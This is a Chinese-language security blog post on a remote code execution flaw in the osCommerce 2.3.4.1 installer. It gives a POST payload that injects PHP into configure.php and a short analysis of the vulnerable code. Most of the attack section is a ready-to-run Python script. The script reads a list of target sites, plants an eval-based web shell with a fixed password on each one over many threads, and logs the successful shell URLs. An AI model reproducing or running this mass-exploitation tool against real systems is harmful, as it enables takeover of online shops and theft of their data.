<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>osCommerce 2.3.4.1 - 远程代码执行漏洞（每日一洞） - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>osCommerce 2.3.4.1 - 远程代码执行漏洞（每日一洞）</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">

</div>
<div class="meta">
  <div>2018-04-02 11:18</div>
  <div>
    <span><a href="https://getshe11.com/tags/oscommerce/">#osCommerce</a></span>
      <span><a href="https://getshe11.com/tags/getshell/">#Getshell</a></span>
      <span><a href="https://getshe11.com/tags/python/">#Python</a></span>
      <span><a href="https://getshe11.com/tags/php/">#PHP</a></span>
      </div>
  </div>
<div class="content">
  <h2 id="0x01-前言">0x01 前言</h2>
<p>好几天没有写了，前两天又去Boom了，差点没缓过来。今天在exploit-db逛看到一个洞，也是install的地方，想去利用上次那个远程数据库技巧来尝试下，发现这个洞根本用不到，不过新手可以学习下哈，也可以收藏下，因为有时候在ctf线下赛的时候官方会拿一些国外的程序给你玩，最近也在写python的漏洞利用工具，欢迎关注我的github。</p>
<h2 id="0x02-环境">0x02 环境</h2>
<p>程序源码下载：https://www.exploit-db.com/apps/ce2796b352d6e0fb4e9f03866ae98541-oscommerce-2.3.4.zip
Web环境:Windows 10+Apache2+PHP5.6+MySQL</p>
<h2 id="0x03-漏洞利用过程">0x03 漏洞利用过程</h2>
<h3 id="1我们先正常安装这个程序">1.我们先正常安装这个程序</h3>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/oscommerce/1.png" alt=""></p>
<h3 id="2执行我们的payload">2.执行我们的payload</h3>
<!-- raw HTML omitted -->
<pre><code>GET:http://127.0.0.1/oscommerce/install/install.php?step=4
POST:DIR_FS_DOCUMENT_ROOT=./&amp;DB_DATABASE=');phpinfo();/*
</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/oscommerce/2.png" alt=""></p>
<h3 id="3访问写入代码的文件">3.访问写入代码的文件</h3>
<pre><code>GET:http://127.0.0.1/oscommerce/install/includes/configure.php
</code></pre>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/oscommerce/3.png" alt="">
写入的内容：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/oscommerce/4.png" alt=""></p>
<h2 id="0x04-漏洞代码分析过程">0x04 漏洞代码分析过程</h2>
<p>漏洞文件出现的位置是：\install\templates\pages\install_4.php</p>
<p>说起这个国外写的程序还没我们国内的严谨，安装完没有写入install.lock或者像Joomla（最近正在写）一样强制让客户删除安装文件。</p>
<p>直接看代码吧，过程也不算太复杂。这里用到了PHP以下的函数<code>$HTTP_POST_VARS</code>这个函数类似与PHP4及以上的<code>$_POST</code>。这里是接收参数的地方。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/oscommerce/5.png" alt=""></p>
<p>最重要还是这里，因为如果没有传入<code>DIR_FS_DOCUMENT_ROOT</code>的话下面写入文件就无法进行了。</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/oscommerce/6.png" alt=""></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/oscommerce/7.png" alt=""></p>
<h2 id="0x05-payload构造">0x05 Payload构造</h2>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/oscommerce/8.png" alt="">
<code>DIR_FS_DOCUMENT_ROOT</code>是必须的了，让它等于根目录./就行了。
写入恶意代码就用<code>DB_DATABASE</code>吧，我们先用闭合<code>');</code>前面，然后再写入phpinfo();,后面它会自动加上');，exploit-db上面是直接加上/*注释掉的，因为这个程序很奇怪，先一遍在install的配置文件，然后再写到程序里面的配置文件，所以就不会顾虑网站会崩的问题了。
payload：
post 模式<code>DIR_FS_DOCUMENT_ROOT=./&amp;DB_DATABASE=');phpinfo();/*</code></p>
<h2 id="0x06-用python编写批量getshell脚本">0x06 用Python编写批量getshell脚本</h2>
<p>我觉得你们应该读得懂这个代码吧，如果有需要的话我以后会把这里面的流程解释一遍。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env</span>
<span style="color:#75715e">#author:F0rmat</span>
<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> threading
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(target):
    <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-f&#34;</span>:
        target<span style="color:#f92672">=</span>target[<span style="color:#ae81ff">0</span>]
    url1<span style="color:#f92672">=</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/install/install.php?step=4&#34;</span>
    data<span style="color:#f92672">=</span>{
    <span style="color:#e6db74">&#39;DIR_FS_DOCUMENT_ROOT&#39;</span>: <span style="color:#e6db74">&#39;./&#39;</span>,
    <span style="color:#e6db74">&#39;DB_DATABASE&#39;</span>:<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">);@eval($_POST[&#39;f0rmat&#39;]);echo &#39;F0rmat&#39;;/*&#34;</span>
    }
    url2<span style="color:#f92672">=</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;install/includes/configure.php&#34;</span>
    <span style="color:#66d9ef">try</span>:
        requests<span style="color:#f92672">.</span>post(url1,data<span style="color:#f92672">=</span>data)
        verify <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url2, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;F0rmat&#34;</span> <span style="color:#f92672">in</span> verify<span style="color:#f92672">.</span>content:
            <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Write success,shell url:&#39;</span>,url2,<span style="color:#e6db74">&#39;pass:f0rmat&#39;</span>
            <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;success.txt&#34;</span>,<span style="color:#e6db74">&#34;a+&#34;</span>) <span style="color:#66d9ef">as</span> f:
                f<span style="color:#f92672">.</span>write(url2<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;  pass:f0rmat&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">print</span> target,<span style="color:#e6db74">&#39;Write failure!&#39;</span>
    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>, e:
        <span style="color:#66d9ef">print</span> e
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">3</span>:
        <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;python osCommerce_rce.py -h target/-f target-file &#39;</span>
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-h&#34;</span>:
            exploit(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>])
        <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-f&#34;</span>:
            <span style="color:#66d9ef">with</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
                b <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
                <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(len(b)):
                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> b[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>:
                        threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>exploit, args<span style="color:#f92672">=</span>(b[i]<span style="color:#f92672">.</span>split(),))<span style="color:#f92672">.</span>start()



<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
    main()
</code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/oscommerce/9.png" alt=""></p>
<h2 id="0x08-结束">0x08 结束</h2>
<p>这个洞确实有点简单了哈哈。</p>
<h2 id="0x09-参考">0x09 参考</h2>
<p><a href="https://www.exploit-db.com/exploits/44374/">https://www.exploit-db.com/exploits/44374/</a>
<a href="https://github.com/F0r3at/Python-Tools">https://github.com/F0r3at/Python-Tools</a></p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
                            0x01 前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x02-%e7%8e%af%e5%a2%83">
                            0x02 环境
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x03-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e8%bf%87%e7%a8%8b">
                            0x03 漏洞利用过程
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#1%e6%88%91%e4%bb%ac%e5%85%88%e6%ad%a3%e5%b8%b8%e5%ae%89%e8%a3%85%e8%bf%99%e4%b8%aa%e7%a8%8b%e5%ba%8f">
                            1.我们先正常安装这个程序
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#2%e6%89%a7%e8%a1%8c%e6%88%91%e4%bb%ac%e7%9a%84payload">
                            2.执行我们的payload
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#3%e8%ae%bf%e9%97%ae%e5%86%99%e5%85%a5%e4%bb%a3%e7%a0%81%e7%9a%84%e6%96%87%e4%bb%b6">
                            3.访问写入代码的文件
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x04-%e6%bc%8f%e6%b4%9e%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90%e8%bf%87%e7%a8%8b">
                            0x04 漏洞代码分析过程
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x05-payload%e6%9e%84%e9%80%a0">
                            0x05 Payload构造
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x06-%e7%94%a8python%e7%bc%96%e5%86%99%e6%89%b9%e9%87%8fgetshell%e8%84%9a%e6%9c%ac">
                            0x06 用Python编写批量getshell脚本
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x08-%e7%bb%93%e6%9d%9f">
                            0x08 结束
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x09-%e5%8f%82%e8%80%83">
                            0x09 参考
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
